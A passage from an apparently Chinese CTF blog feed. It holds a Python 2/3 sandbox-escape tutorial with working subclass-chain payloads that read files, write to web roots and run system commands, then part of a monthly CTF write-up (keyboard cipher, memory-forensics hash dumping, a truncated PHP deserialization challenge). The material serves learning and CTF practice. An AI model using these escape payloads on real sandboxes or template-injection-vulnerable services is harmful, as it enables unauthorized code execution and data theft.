class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>在py2中，在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p><p>非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>如果导入的模块a中有着另一个模块b，那么，我们可以用<code>a.b</code>的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p><h3 id="弄一个沙盒环境"><a href="#弄一个沙盒环境" class="headerlink" title="弄一个沙盒环境"></a>弄一个沙盒环境</h3><p>一般读取目录的时候需要使用到<code>os.system</code>函数，这样的一句话这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure><p>然后我们可以把一些关键模块给删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># 管理员删了很多的危险函数</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'...'</span>]</span><br></pre></td></tr></table></figure><p>这时候import已经失效了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>但是可以用 reload来重新导入模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure><p>但是请注意，在<strong>Python 3.0把reload内置函数移到了import库模块中。</strong>所以python3中，这个方法已经失效了</p><p>所以在制作py2.7沙箱的时候，还需要删除<code>reload</code>的方法。</p><h3 id="一道题目"><a href="#一道题目" class="headerlink" title="一道题目"></a>一道题目</h3><p>这个题目很常见了，py2的环境，自己拿来练下手,最后是读取当前文件夹下的key文件，删除了很多关键函数，也包括了<code>reload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'compile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'S+'</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><h4 id="用file类去读取文件"><a href="#用file类去读取文件" class="headerlink" title="用file类去读取文件"></a>用file类去读取文件</h4><p>面对这个时候我们已经不能使用<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>去读取文件但我们可以利用object类去寻找file类去读取文件内容</p><p>思路是这样的：</p><ol><li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li><li>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</li><li>用<code>__subclasses__()</code>拿到子类列表</li><li>在子类列表中直接寻找可以利用的类</li></ol><p>也就是</p><p><code>().__class__.__bases__[0].__subclasses__()[40]</code></p><p>但是面对<code>__subclasses__</code>的子类太多找不到对应的file类怎么办？可以这样去寻找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span>   <span class="comment">#这里填写你要寻找的类即可</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后可以用dir函数查看里面的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure><p>所以最后的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br><span class="line"><span class="comment">#同样的效果</span></span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>注意py3已经移除了file了这种方法也只能在py3里面使用</p><h4 id="利用内置函数执行命令"><a href="#利用内置函数执行命令" class="headerlink" title="利用内置函数执行命令"></a>利用内置函数执行命令</h4><p>可以根据第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），查找<code>os</code>模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 71)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 76)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>然后构造继承链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>但是这个方法也只能在py2里面实现，同样在前面的SSTI注入中vulhub给的测试payload用的是<code>class &#39;warnings.catch_warnings&#39;</code>这一个类，同样这个类里面也有os模块，可以像下面这个样子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:返回一个包含函数全局变量的字典引用；</span></span><br></pre></td></tr></table></figure><p>上面的方法大都有限制，py2跟py3可以使用<code>__builtins__</code>通吃</p><p>py3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>py2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>因为<code>__builtins__</code>返回的是一个字典。通过has_key的方法，可以发现我们想要的是否存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__.has_key(<span class="string">'reload'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>所以在出题的时候我们可以把该模块下的函数删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br></pre></td></tr></table></figure><h2 id="python-代码执行函数与新特性以及f修饰符"><a href="#python-代码执行函数与新特性以及f修饰符" class="headerlink" title="python 代码执行函数与新特性以及f修饰符"></a>python 代码执行函数与新特性以及f修饰符</h2><p>下面内容摘取自<code>https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</code>以及<code>http://shaobaobaoer.cn/archives/656/python-sandbox-escape</code></p><p>在python中常见的代码执行函数如下所示</p><p>（1）timeit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>（2）exec 和eval 比较经典了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br></pre></td></tr></table></figure><p>（3）platform</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure><p>  (4) getattr() 和 getattribute()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>​    (5)f修饰符</p><p>用f修饰的字符串将可以执行代码, 但只有python版本在 3.6.0朝上才有这个方法</p><p><img src="https://s2.ax1x.com/2019/02/08/kNEfSK.png" alt="kNEfSK.png"></p><p>这种代码执行方法和PHP中的<code>&lt;?php &quot;${@phpinfo()}&quot;; ?&gt;</code>很类似，这是Python中很少有的几个能够直接将字符串转变成的代码的方式</p><p>执行代码总结</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上述命令需要通过哦 exec 或者别的命令执行函数执行</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; 对应 <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class">推荐的另外一个类</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure><p>就先总结到这里吧，感觉这个东西联系起SSTI还是可以起很大的作用的。</p><p>参考：</p><p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12</a></p><p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p><p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h3&gt;&lt;p&gt;一些函数需要了解一下，这篇文章讲的已经很详细
    
    </summary>
    
      <category term="沙盒绕过" scheme="0verwatch.top/categories/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
    
      <category term="沙盒绕过" scheme="0verwatch.top/tags/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>安恒一月赛做题记录</title>
    <link href="0verwatch.top/anheng-1mongth.html"/>
    <id>0verwatch.top/anheng-1mongth.html</id>
    <published>2019-02-03T09:05:51.000Z</published>
    <updated>2019-02-08T10:15:25.705Z</updated>
    
    <content type="html"><![CDATA[<p>这个月的安恒月赛好像很有意思<a id="more"></a>，自己忘了去参加了2333，回过头做一做记录一下</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h4><p>百度可以知道历史上有两种键盘，QWERTY键盘还是Dvorak键盘？</p><p>其实就是他们两个的键盘对应的位置不一样导致的映射关系，可以用在线网站解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wbic16.xedoloh.com/dvorak.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYiUgJ.png" alt="kYiUgJ.png"></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h4><p>都是些常规操作，binwalk–&gt;foremost–&gt;stegsolve，说真的现在都不想玩隐写</p><p><img src="https://s2.ax1x.com/2019/02/05/kYihDI.png" alt="kYihDI.png"></p><h4 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h4><p>这个隐写题目就有点意思啦，我以前没碰到过这种内存取证的，可以参考下面的文章<code>https://www.freebuf.com/column/152545.html</code>，这篇文章介绍了很多关于内存取证这款软件的操作，大致的volatility 使用可以概括如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f &lt;文件名&gt; –profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</span><br></pre></td></tr></table></figure><p>使用imageinfo插件来猜测dump文件的profile值，<code>volatility -f memory imageinfo</code>，得到profile值为<code>WinXPSP2x86</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYFHdx.png" alt="kYFHdx.png"></p><p>直接hashdump，毕竟在Windows系统下面，但常规还是得查注册表位置，找到system和sam key的起始位置<code>hivelist -f memory -profile=WinXPSP2x86</code>，这里就不演示了，直接hashdump了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory --profile=WinXPSP2x86 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/05/kYkZlQ.png" alt="kYkZlQ.png"></p><p>获得密码<code>c22b315c040ae6e0efee3518d830362b</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kYkumn.png" alt="kYkumn.png"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h4><p>上来就一个源码，但看到<code>unserialize</code>应该就是往反序列化那个方向思考。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span 